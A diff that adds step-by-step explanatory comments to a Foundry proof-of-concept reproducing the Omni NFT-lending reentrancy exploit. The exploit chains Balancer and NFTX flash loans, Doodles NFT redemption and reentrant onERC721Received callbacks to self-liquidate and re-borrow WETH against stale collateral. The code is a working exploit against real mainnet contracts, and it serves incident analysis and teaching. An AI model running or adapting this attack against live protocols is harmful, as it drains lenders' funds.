@@ -7,6 +7,9 @@ import "./../interface.sol";
 // Credit: SupremacyCA, the poc rewritten from SupremacyCA.
 
 contract ContractTest is Test {
+    // VULNERABILITY (leveraged here): Cross-function reentrancy due to unsafe external call order in NFT collateral ops (checks-effects-interactions violation)
+    // See detailed comment at interface.sol:IOmni. Omni's withdrawERC721/liquidationERC721 execute the ERC721 safeTransferFrom (firing onERC721Received) *before* mutating the user's collateral list, health factors, or totalCollateral. Reentrant calls observe stale state.
+    // Impact: Protocol lenders lose the value of extracted borrows (~63 ETH in incident); attacker drains WETH leaving unbacked debt on the position.
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 doodle = IERC20(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
     IDOODLENFTXVault doodleVault = IDOODLENFTXVault(0x2F131C4DAd4Be81683ABb966b4DE05a549144443);
@@ -40,6 +43,7 @@ contract ContractTest is Test {
         uint256[] memory amounts = new uint256[](1);
         amounts[0] = 1000 ether;
 
+        // EXPLOIT STEP 1: Flash-borrow 1000 WETH from Balancer. This provides the capital to buy the NFTX shares needed to redeem the specific Doodles NFTs that will be used as collateral. No collateral needed for the flash.
         balancer.flashLoan(address(this), tokens, amounts, "");
     }
 
@@ -47,6 +51,7 @@ contract ContractTest is Test {
         require(msg.sender == address(balancer), "You are not a market maker for Flash Loan!");
         doodle.approve(address(doodle), type(uint256).max);
         doodles.setApprovalForAll(address(doodle), true);
+        // EXPLOIT STEP 2: Flash-borrow 20 DOODLE (NFTX vault shares) from the Doodle NFTX vault (ERC-3156 flashLoan). This lets us redeem without first depositing NFTs. We will repay by re-minting at the end.
         doodleVault.flashLoan(address(this), address(doodle), 20 ether, "");
     }
 
@@ -59,6 +64,7 @@ contract ContractTest is Test {
         _path[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
         _path[1] = 0x2F131C4DAd4Be81683ABb966b4DE05a549144443; // DOODLE
 
+        // EXPLOIT STEP 3: Swap ~1.2 WETH for 20 DOODLE vault shares on Sushi (exact-out). These shares are the "ticket" to redeem 20 specific Doodles from the NFTX vault.
         router.swapTokensForExactTokens(12e17, 200 ether, _path, address(this), block.timestamp);
 
         uint256[] memory _specificIds = new uint256[](20);
@@ -83,6 +89,7 @@ contract ContractTest is Test {
         _specificIds[18] = 5251;
         _specificIds[19] = 7425;
 
+        // EXPLOIT STEP 4: Call redeem on the NFTX vault with the 20 shares + chosen tokenIds. Because we flashed the shares, the vault safeTransfers the actual Doodles ERC721s to us. This also triggers 20x onERC721Received (nonce will reach 20).
         doodleVault.redeem(20, _specificIds);
 
         require(doodles.balanceOf(address(this)) >= 20, "redeem error.");
@@ -96,9 +103,11 @@ contract ContractTest is Test {
         uint256 length = _specificIds.length;
 
         for (uint256 i = 0; i < length; i++) {
+            // Note: transferFrom (not safe) so no onERC721 callback here. Lib now owns the 20 NFTs.
             doodles.transferFrom(address(this), address(_lib), _specificIds[i]);
         }
 
+        // EXPLOIT STEP 5: Trigger the first borrow+partial-withdraw on Lib. This will cause 2x safeTransferFrom from pool (during withdrawERC721) that drive the nonce-based reentrancy.
         lib.joker();
 
         uint256[] memory _amount = new uint256[](20);
@@ -107,8 +116,10 @@ contract ContractTest is Test {
             _amount[j] = 0;
         }
 
+        // EXPLOIT STEP 8 (post reentrancy): After the nested callbacks (liquidation + attack borrow) have executed inside the reentrant onERC721Received, call withdrawAll on Lib to pull the 20 NFTs (now "supplied" under the reentrant borrow) out of the pool to us. Because of the reentrancy the accounting was not properly decremented, the withdraw succeeds while debt remains.
         require(ILib(_lib).withdrawAll(), "Withdraw Error.");
 
+        // EXPLOIT STEP 9: Re-mint the 20 Doodles back into the NFTX vault (using zero amounts for ERC721) to obtain the 20 DOODLE shares and repay the NFTX flash loan.
         require(doodleVault.mint(_specificIds, _amount) == 20, "Error Amounts.");
 
         uint256 profit = getters();
@@ -118,13 +129,17 @@ contract ContractTest is Test {
     }
 
     function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
+        // This callback is the reentrancy vector. It is invoked by the Doodles ERC721 contract during safeTransferFrom executed inside Omni's withdrawERC721 and liquidationERC721.
+        // Because those pool functions transfer BEFORE updating collateral accounting, when we are inside this callback the pool still believes the token is (or was) supplied as collateral for the Lib user.
         if (msg.sender == NToken) {
             if (nonce == 21) {
+                // EXPLOIT STEP 6 (reentrancy #1, triggered on 2nd withdraw receive during joker): During the pool's safeTransfer of one of the withdrawn NFTs, nonce hits 21. We immediately call liquidationERC721 on the remaining collateral NFT (7425) of Lib. This self-liquidation succeeds at a discount (100 WETH repayment for the NFT) because health/collateral state is still stale from the in-progress withdraw. The liquidation itself will also transfer the NFT, triggering the next receive.
                 nonce++;
                 WETH.approve(address(pool), type(uint256).max);
                 pool.liquidationERC721(address(doodles), address(WETH), address(_lib), 7425, 100 ether, false);
                 return this.onERC721Received.selector;
             } else if (nonce == 22) {
+                // EXPLOIT STEP 7 (reentrancy #2, triggered by the liquidation transfer): Now move three NFTs (incl. the just-liquidated one) to Lib and call attack() which supplies ALL 20 as fresh collateral and immediately borrows the maximum possible WETH against them (81+ WETH). Because the prior operations' state updates were bypassed by reentrancy, the pool allows pledging the same economic NFTs again and extending massive new debt.
                 uint256[] memory _specificIds = new uint256[](3);
                 _specificIds[0] = 720;
                 _specificIds[1] = 5251;
@@ -240,6 +255,7 @@ contract Lib {
         _params[2].tokenId = 7425;
         _params[2].useAsCollateral = true;
 
+        // EXPLOIT (inside joker): supply 3 specific NFTs as collateral for this Lib identity, then borrow their full value in WETH. Then withdraw 2 of them. The withdrawERC721 inside the pool will trigger onERC721Received (on the exp) *before* it finishes clearing the collateral from Lib's position record.
         pool.supplyERC721(address(doodles), _params, address(this), 0);
 
         (,, uint256 amount,,,,) = pool.getUserAccountData(address(this));
@@ -251,6 +267,7 @@ contract Lib {
         tokenIds[0] = 720;
         tokenIds[1] = 5251;
 
+        // VULNERABILITY TRIGGER: This withdrawERC721 call on the pool performs the NFT safeTransfer *before* completing the accounting update. The resulting onERC721Received re-enters the attack.
         require(pool.withdrawERC721(address(doodles), tokenIds, address(exp)) == 2, "Withdraw Error.");
     }
 
@@ -319,6 +336,7 @@ contract Lib {
         _params[19].tokenId = 7425;
         _params[19].useAsCollateral = true;
 
+        // EXPLOIT (inside attack, called reentrantly): Supply *all* 20 Doodles as collateral while the prior withdraw/liquidate callstack is still open. Then borrow the max against the new (inflated) position. The stale accounting lets the pool accept the supply/borrow without seeing the prior removals/liquidations.
         pool.supplyERC721(address(doodles), _params, address(this), 0);
 
         (,, uint256 amount,,,,) = pool.getUserAccountData(address(this));
@@ -351,6 +369,7 @@ contract Lib {
         _specificIds[18] = 5251;
         _specificIds[19] = 7425;
 
+        // This final withdrawERC721 drains the 20 NFTs that were (re)supplied in the reentrant attack(). The pool's failure to have atomically updated state during the reentrant supply/borrow means the collateral can be removed while the large borrow debt stays recorded against the (now empty) position.
         pool.withdrawERC721(address(doodles), _specificIds, address(exp));
 
         uint256 balance = WETH.balanceOf(address(this));
